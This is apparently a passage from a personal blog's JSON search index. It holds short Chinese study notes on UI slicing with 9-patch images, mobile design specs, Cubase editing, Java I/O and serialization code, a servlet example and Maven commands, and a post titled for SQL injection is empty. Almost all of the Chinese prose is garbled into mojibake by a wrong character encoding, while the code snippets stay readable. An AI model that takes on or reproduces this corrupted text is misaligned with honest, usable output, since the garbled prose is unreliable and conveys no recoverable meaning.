çš„åœ°æ–¹å°±å¯ä»¥äº†è¿™æ ·æ‹‰ä¼¸çš„æ—¶å€™ä¼šæ‹‰ä¼¸é€æ˜éƒ¨åˆ†çš„åƒç´ ï¼Œè€Œä¸ä¼šæ‹‰ä¼¸å›¾åƒçš„æœ¬èº«å›¾ä¸­æ‹‰ä¼¸åŒºåŸŸçš„é»‘ç‚¹æ˜¯ä¸è¿ç»­çš„ï¼Œé‚£å°±è¡¨æ˜è¿™äº›åœ°æ–¹æ˜¯ä¸å¯æ‹‰ä¼¸çš„ï¼Œå› ä¸ºè¿™ä¸ªç®­å¤´å…¶å®å®ƒæ˜¯ä¸€ä¸ªä¸è§„åˆ™çš„å›¾å½¢ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¸Œæœ›å®ƒè¢«æ‹‰ä¼¸å¯ä»¥ç”¨ Draw 9-patch ï¼Œä¹Ÿå¯ä»¥ç”¨ ps ç›´æ¥è¾“å‡ºps ç›´æ¥è¾“å‡ºçš„æ–¹å¼ï¼š å…ˆè¾“å‡ºæ™®é€šçš„ png èµ„æºï¼Œç„¶åæ‰©å¤§ç”»å¸ƒå¤§å°ï¼Œä¸Šä¸‹å·¦å³å„ç•™å‡ºä¸€ä¸ªåƒç´ ï¼Œå†ç”¨åƒç´ çš„é“…ç¬”å·¥å…·ï¼Œé¢œè‰²é€‰æ‹©çº¯é»‘è‰²ï¼Œä¸Šä¸‹å·¦å³åˆ†åˆ«ç”»ç‚¹å°±å¯ä»¥äº† ä¿å­˜çš„æ—¶å€™åç¼€å ä¸€å®šè¦æ”¹ä¸º `.9.png` åˆ‡å›¾çš„æ³¨æ„äº‹é¡¹","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"ç§»åŠ¨ç«¯è®¾è®¡è§„èŒƒ","slug":"history/ui/5a330a4347e0b7d3188a6a37","date":"2017-12-14T23:33:23.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a330a4347e0b7d3188a6a37/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a330a4347e0b7d3188a6a37/","excerpt":"","text":"ç§»åŠ¨ç«¯è®¾è®¡è§„èŒƒè§„èŒƒè®¾è®¡è¿ç”¨åˆ°çš„å·¥å…· è§„èŒƒè®¾è®¡æŒ‡å®šçš„æ—¶é—´ è§„èŒƒè®¾è®¡çš„ç»„æˆéƒ¨åˆ† è‰²å½©è§„èŒƒ æ§ä»¶è§„èŒƒ æ–‡å­—å’Œæ’ç‰ˆè§„èŒƒ å¿«è¯»æ ‡æ³¨å·¥å…· ç®€ä»‹photoshop ä½å›¾è½¯ä»¶/å›¾æ ‡/æ’ç”»/é¡µé¢/æµ·æŠ¥ IIustrator çŸ¢é‡è½¯ä»¶/å›¾æ ‡/æ’ç”»/åŒ…è£… åˆ‡å›¾/svg Sketch çŸ¢é‡è½¯ä»¶/UI/icon å¯¼å‡ºæ–‡ä»¶è¾ƒå° æŒ‡å®šè§„èŒƒçš„æ—¶æœºè“è‰²ä¸»è¦ç”¨äºä¸€äº›é“¾æ¥çš„é¢œè‰²ï¼Œä¸€äº›å¯ç‚¹å‡»çš„é¢œè‰²æ ¹æ®å†…å®¹é‡è¦æ€§ç”±æ·±åˆ°æµ…ä¸€çº§æ–‡å­—é¢œè‰²æ˜¯ä¸€äº›æœ€é‡è¦çš„æ–‡å­—äºŒçº§æ–‡å­—é¢œè‰²å¯èƒ½æ˜¯ä¸€äº›å¤§é‡çš„é˜…è¯»æ€§æ–‡å­—æ¬¡æŒ‰é’®ä¸€èˆ¬å‡ºç°åœ¨å†…é¡µæˆ–è€…è¯´æ˜¯ä¸€äº›æ¯”è¾ƒå°çš„ä½ç½®åº•éƒ¨å¯¼èˆªç‚¹å‡»è‰²ä¸ºæ•´ä¸ªappçš„ä¸»è‰²è°ƒ","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"cubase å­¦ä¹ ","slug":"history/music/5a339b0947e0b7d3188a6a41","date":"2017-12-14T21:51:05.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5a339b0947e0b7d3188a6a41/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5a339b0947e0b7d3188a6a41/","excerpt":"","text":"1.è·¯çº¿ æ·»åŠ å¤šä¸ªçº¿è·¯ã€‚ 2.è½¨é“ æ·»åŠ å¤šä¸ªè½¨é“ã€‚ 3.å½•éŸ³ æ‰¾å‡ºæ­Œæ›²çš„èŠ‚æ‹é€Ÿåº¦ å¯ä»¥æˆªå–æ²¡æœ‰äººå£°ï¼Œå¸¦é¼“èŠ‚å¥çš„éƒ¨åˆ†ç®—å‡ºæ­Œæ›²çš„é€Ÿåº¦ã€‚ 4.ç¼–è¾‘å½•åˆ¶çš„äººå£°ï¼Œå¯ä»¥é‡å¤å½•åˆ¶ç›¸åŒéƒ¨åˆ†çš„äººå£°ï¼Œå±•å¼€åˆ†æå¤šæ¬¡ç›¸åŒéƒ¨åˆ†ï¼Œåˆ†æï¼Œä¿®å‰ªã€‚ 5.äººå£°ä¸­ç©ºç™½å¤„çš„ï¼Œæ·¡è¿›ï¼Œæ·¡å‡ºæ•ˆæœç¼–è¾‘ï¼Œç¼–è¾‘è¡°å‡äººå£°ä¸­çš„å‘¼å¸å£°ï¼Œå¯ä»¥ä»æ³¢å½¢å›¾ä¸­ä¸‹å‹æ³¢å½¢ï¼Œä¹Ÿå¯ä»¥ç¼–è¾‘é€‰ä¸­çš„ç‰‡æ®µè°ƒæ•´å¢ç›Šå€¼ã€‚ 6.ä½¿ç”¨wavetune æ’ä»¶ï¼Œç›‘æ§äººå£°éŸ³é«˜çš„éƒ¨åˆ†ï¼Œå¹¶ä¸”ä¼šé¢„å¤„ç†ä¸€éƒ¨åˆ†ï¼Œä¿®å¤éŸ³å‡†é—®é¢˜ï¼ˆå‘ï¼šå½“ä¸€å¥æ­Œè¯å¤„äºä¸¤ä¸ªéŸ³ä¸­é—´çš„ä½ç½®ï¼Œæ’ä»¶å¯èƒ½å¤„ç†ä¸å¯¹ï¼Œéœ€è¦æ‰‹åŠ¨å¤„ç†ä½¿ç”¨é“…ç¬”å·¥å…·å¯ä»¥ç”»å£°è°ƒçš„é«˜ä½ï¼‰ å‰ªåˆ€å·¥å…·ï¼ŒçŸ«æ­£é€Ÿåº¦ï¼ˆæ©˜è‰²æ˜¯åŸå§‹å£°éŸ³çš„æ›²çº¿ï¼Œç»¿è‰²æ˜¯æ’ä»¶ä¿®å‰ªåçš„å£°éŸ³çš„æ›²çº¿ï¼Œé¢¤éŸ³ç”»æ³¢æµªçº¿ï¼‰ 7.è™šæ‹Ÿä¹å™¨çš„ç¼–è¾‘ï¼šæ·»åŠ ä¹å™¨è½¨","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"baipeng"},{"title":"spring AOP","slug":"history/tech/5a3356f747e0b7d3188a6a40","date":"2017-12-14T17:00:39.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3356f747e0b7d3188a6a40/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3356f747e0b7d3188a6a40/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sql æ³¨å…¥","slug":"history/tech/5a3259c747e0b7d3188a6a36","date":"2017-12-13T23:00:23.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3259c747e0b7d3188a6a36/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3259c747e0b7d3188a6a36/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"jdbc","slug":"history/tech/5a324ec847e0b7d3188a6a35","date":"2017-12-13T22:13:28.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a324ec847e0b7d3188a6a35/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a324ec847e0b7d3188a6a35/","excerpt":"","text":"æ¨èè¿æ¥æ•°è®¾ç½®ä¸ºä¸šåŠ¡å¹³å‡è®¿é—®é‡æ¨èæœ€å¤§æœ€å°idle(ç©ºé—²è¿æ¥)è®¾ç½®æˆä¸€æ ·çš„å€¼ï¼Œé¿å…è¿æ¥çš„åå¤åˆ›å»ºå’Œé”€æ¯çš„å¼€é”€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"jsp","slug":"history/tech/5a324a1b47e0b7d3188a6a34","date":"2017-12-13T21:53:31.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a324a1b47e0b7d3188a6a34/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a324a1b47e0b7d3188a6a34/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"servlet","slug":"history/tech/5a32304547e0b7d3188a6a33","date":"2017-12-13T20:03:17.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a32304547e0b7d3188a6a33/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a32304547e0b7d3188a6a33/","excerpt":"","text":"servlet sessionç›‘å¬å™¨ package com.netease.server.example.web.controller; import java.io.IOException; import java.io.PrintWriter; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ConcurrentServlet extends HttpServlet { String name; /** * */ private static final long serialVersionUID = -6948878379930865229L; @Override public void init() throws ServletException { super.init(); } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { synchronized (this) { name = req.getParameter(&quot;username&quot;); PrintWriter out = resp.getWriter(); try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } out.println(&quot;username: &quot; + name); } } @Override public void destroy() { super.destroy(); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç‰ˆæœ¬ç®¡ç†","slug":"history/tech/5a322f0c47e0b7d3188a6a32","date":"2017-12-13T19:58:04.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a322f0c47e0b7d3188a6a32/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a322f0c47e0b7d3188a6a32/","excerpt":"","text":"ç‰ˆæœ¬ç®¡ç†LVCS æœ¬åœ° CVCS é›†ä¸­å¼ DVCS åˆ†å¸ƒå¼ CVCS CVS SVN Perforce å¸¸ç”¨ç‰ˆæœ¬ç®¡ç†git Mercurial","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac ä¸‹æŸ¥çœ‹äºŒçº§åˆ¶æ–‡ä»¶","slug":"history/tech/5a322ebe47e0b7d3188a6a31","date":"2017-12-13T19:56:46.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a322ebe47e0b7d3188a6a31/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a322ebe47e0b7d3188a6a31/","excerpt":"","text":"0xEDhexdumphexdump xxx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"çŸ¢é‡","slug":"history/ui/5a322e8e47e0b7d3188a6a30","date":"2017-12-13T19:55:58.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a322e8e47e0b7d3188a6a30/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a322e8e47e0b7d3188a6a30/","excerpt":"","text":"çŸ¢é‡svg å­—ä½“å›¾æ ‡ icon font","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"maven åŸºæœ¬å‘½ä»¤","slug":"history/tech/5a32067d863b4f2b5a550b8a","date":"2017-12-13T17:05:01.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a32067d863b4f2b5a550b8a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a32067d863b4f2b5a550b8a/","excerpt":"","text":"äººè‚‰å¼maven åŸºæœ¬å‘½ä»¤mvn archetype:generate # ä½¿ç”¨æ¨¡æ¿ç”Ÿæˆé¡¹ç›® mvn compile # ç¼–è¯‘ mvn test # æµ‹è¯• mvn package # æ‰“waråŒ… mvn deploy # éƒ¨ç½² mvn site # é¡¹ç›®ç›¸å…³çš„ç«™ç‚¹ï¼Œåœ¨çº¿æ–‡æ¡£ mvn clean # æ¸…ç† mvn install # å°†åŒ…å®‰è£…åˆ°æœ¬åœ°ä»“åº“ Tomcat å®˜æ–¹æä¾›ä¸€ä¸ª Maven æ’ä»¶è¯¦ç»†å¸®åŠ© mvn help:describe -Dplugin=tomcat7 å¸¸è§å‘½ä»¤ mvn tomcat7:run # å¯åŠ¨ä¸€ä¸ªåµŒå…¥çš„Tomcat å®ä¾‹ mvn tomcat:deploy mvn tomcat:undeploy æ‰‹åŠ¨ç”Ÿæˆå·¥ç¨‹mvn archetype:generate \\ -DgroupId=com.netease.restaurant \\ -DartifactId=Restaurant \\ -Dpackage=com.netease \\ -Dversion=1.0.0-SNAPSHOT \\ -DarchetypeArtifactId=maven-archetype-webapp å‘½ä»¤mvn help:describe -Dplugin=compiler -Dgoal=compile -Ddetail=true","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"HTTP 1.1çš„RFCæ–‡æ¡£","slug":"history/tech/5a30a2e0863b4f2b5a550b80","date":"2017-12-13T03:47:44.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a30a2e0863b4f2b5a550b80/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a30a2e0863b4f2b5a550b80/","excerpt":"","text":"RFC 2616 https://tools.ietf.org/html/rfc2616å‚è€ƒä¹¦ç±ã€Šå›¾è§£HTTPã€‹ã€ŠHTTPæƒå¨æŒ‡å— (HTTP:The Definitive Guide)ã€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¯¹è±¡ä¸²è¡ŒåŒ–","slug":"history/tech/5a309c38863b4f2b5a550b7f","date":"2017-12-13T03:19:20.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a309c38863b4f2b5a550b7f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a309c38863b4f2b5a550b7f/","excerpt":"","text":"å¯¹è±¡ä¸²è¡ŒåŒ–package test; import java.io.BufferedInputStream; import java.io.BufferedOutputStream; import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStreamReader; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.OutputStreamWriter; import java.io.PrintWriter; import java.io.Serializable; import java.net.InetAddress; import java.net.Socket;; class Student implements Serializable { private String name; private int age; private int grade; public Student(String name, int age, int grade) { this.name = name; this.age = age; this.grade = grade; } public String toString() { return name + &quot; &quot; + age + &quot; &quot; + grade; } } public class Hello{ public static void main(String[] args) { Student s1 = new Student(&quot;John&quot;, 18, 5); System.out.println(s1); try { ObjectOutputStream out = new ObjectOutputStream( new FileOutputStream(&quot;obj.dat&quot;)); out.writeObject(s1); out.close(); ObjectInputStream in = new ObjectInputStream( new FileInputStream(&quot;obj.dat&quot;)); Student s2 = (Student)in.readObject(); System.out.println(s2); in.close(); System.out.println(s1 == s2); }catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); }catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"java æµåº”ç”¨","slug":"history/tech/5a309447863b4f2b5a550b7e","date":"2017-12-13T02:45:27.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a309447863b4f2b5a550b7e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a309447863b4f2b5a550b7e/","excerpt":"","text":"å…ˆç›‘å¬ä¸€ä¸ªç«¯å£:nc -l -p 12345 java ä»£ç :package test; import java.io.BufferedInputStream; import java.io.BufferedOutputStream; import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStreamWriter; import java.io.PrintWriter; import java.net.InetAddress; import java.net.Socket;; public class Hello{ public static void main(String[] args) { try { Socket socket = new Socket(InetAddress.getByName(&quot;localhost&quot;), 12345); PrintWriter out = new PrintWriter( new BufferedWriter( new OutputStreamWriter( socket.getOutputStream()))); out.println(&quot;hello&quot;); out.flush(); BufferedReader in = new BufferedReader( new InputStreamReader( socket.getInputStream())); String line; line = in.readLine(); System.out.println(line); out.close(); socket.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®‰å“ material design","slug":"history/tech/5a308df3863b4f2b5a550b7d","date":"2017-12-13T02:18:27.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a308df3863b4f2b5a550b7d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a308df3863b4f2b5a550b7d/","excerpt":"","text":"https://developer.android.com/design/index.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è®¾è®¡æµç¨‹","slug":"history/ui/5a31344c863b4f2b5a550b89","date":"2017-12-13T02:08:12.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a31344c863b4f2b5a550b89/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a31344c863b4f2b5a550b89/","excerpt":"","text":"æ ¼å¼å¡”çš„åº”ç”¨ å¸¸è§é—®é¢˜ è§†è§‰æµæ³¨ç›®åº¦è§†è§‰å…ƒç´  äº¤äº’ éœ€è¦æ³¨æ„çš„ç‚¹äº§å“éœ€æ±‚ åŸºæœ¬éœ€æ±‚ æœŸæœ›å‹éœ€æ±‚ å…´å¥‹å‹éœ€æ±‚ ui éœ€è¦æ³¨æ„çš„ ç´ æ æ’ç‰ˆ é…è‰² èƒŒæ™¯ å­—ä½“ è£…é¥° å¯¹æ¯”","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"java è¾“å…¥è¾“å‡º","slug":"history/tech/5a307bd0863b4f2b5a550b7c","date":"2017-12-13T01:01:04.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a307bd0863b4f2b5a550b7c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a307bd0863b4f2b5a550b7c/","excerpt":"","text":"æ ‡å‡†è¾“å…¥è¾“å‡ºæµpackage test; import java.io.IOException; public class Hello{ public static void main(String[] args) { byte[] buffer = new byte[1024]; try { int len = System.in.read(buffer); String s = new String(buffer, 0, len); System.out.println(&quot;è¯»åˆ°äº†:&quot; + len + &quot;å­—èŠ‚&quot;); System.out.println(s); System.out.println(&quot;sçš„é•¿åº¦æ˜¯:&quot; + s.length()); }catch(IOException e) { e.printStackTrace(); } } } æ–‡ä»¶æµpackage test; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; public class Hello{ public static void main(String[] args) { byte[] buffer = new byte[10]; for(int i = 0; i&lt; buffer.length; i++) { buffer[i] = (byte)i; } try { FileOutputStream out = new FileOutputStream(&quot;test.dat&quot;); out.write(buffer); out.close(); }catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); }catch (IOException e) { } } } æµè¿‡æ»¤å™¨å¦‚æœå†™å…¥çš„æ˜¯åè¿›åˆ¶ï¼Œå®é™…å†™å…¥æ–‡ä»¶çš„æ˜¯äºŒè¿›åˆ¶package test; import java.io.BufferedInputStream; import java.io.BufferedOutputStream; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; public class Hello{ public static void main(String[] args) { byte[] buffer = new byte[10]; for(int i = 0; i&lt; buffer.length; i++) { buffer[i] = (byte)i; } try { DataOutputStream out = new DataOutputStream( new BufferedOutputStream( new FileOutputStream(&quot;test.dat&quot;))); int i = 123456; out.writeInt(i); out.close(); DataInputStream in = new DataInputStream( new BufferedInputStream( new FileInputStream(&quot;test.dat&quot;))); int j = in.readInt(); System.out.println(j); }catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); }catch (IOException e) { } } } æ–‡æœ¬æµpackage test; import java.io.BufferedInputStream; import java.io.BufferedOutputStream; import java.io.BufferedWriter; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.OutputStreamWriter; import java.io.PrintWriter; public class Hello{ public static void main(String[] args) { byte[] buffer = new byte[10]; for(int i = 0; i&lt; buffer.length; i++) { buffer[i] = (byte)i; } try { PrintWriter out = new PrintWriter( new BufferedWriter( new OutputStreamWriter( new FileOutputStream(&quot;test.txt&quot;)))); int i = 123456; out.println(i); out.close(); }catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); }catch (IOException e) { } } } è¯»å–æ–‡æœ¬package test; import java.io.BufferedInputStream; import java.io.BufferedOutputStream; import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStreamWriter; import java.io.PrintWriter; public class Hello{ public static void main(String[] args) { byte[] buffer = new byte[10]; for(int i = 0; i&lt; buffer.length; i++) { buffer[i] = (byte)i; } try { PrintWriter out = new PrintWriter( new BufferedWriter( new OutputStreamWriter( new FileOutputStream(&quot;test.txt&quot;)))); int i = 123456; out.println(i); out.close(); BufferedReader in = new BufferedReader( new InputStreamReader( new FileInputStream(&quot;src/test/Hello.java&quot;))); /* //æŒ‡å®šç¼–ç  BufferedReader in = new BufferedReader( new InputStreamReader( new FileInputStream(&quot;src/test/Hello.java&quot;), &quot;utf8&quot;)); */ String line; while((line = in.readLine()) != null) { System.out.println(line); } }catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); }catch (IOException e) { } } } æ±‰å­—ç¼–ç ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"JFrame ç¤ºä¾‹","slug":"history/tech/5a3079fe863b4f2b5a550b7b","date":"2017-12-13T00:53:18.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3079fe863b4f2b5a550b7b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3079fe863b4f2b5a550b7b/","excerpt":"","text":"JFrame ç¤ºä¾‹package test; import javax.swing.JFrame; public class Hello{ public static void main(String[] args) { JFrame frame = new JFrame(); frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); frame.setResizable(false); frame.setTitle(&quot;ç»†èƒè‡ªåŠ¨æœº&quot;); //frame.add(view); frame.pack(); frame.setVisible(true); } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç”¨æˆ·ä½“éªŒ","slug":"history/ui/5a312267863b4f2b5a550b88","date":"2017-12-13T00:51:51.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a312267863b4f2b5a550b88/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a312267863b4f2b5a550b88/","excerpt":"","text":"KANO æ¨¡å‹ 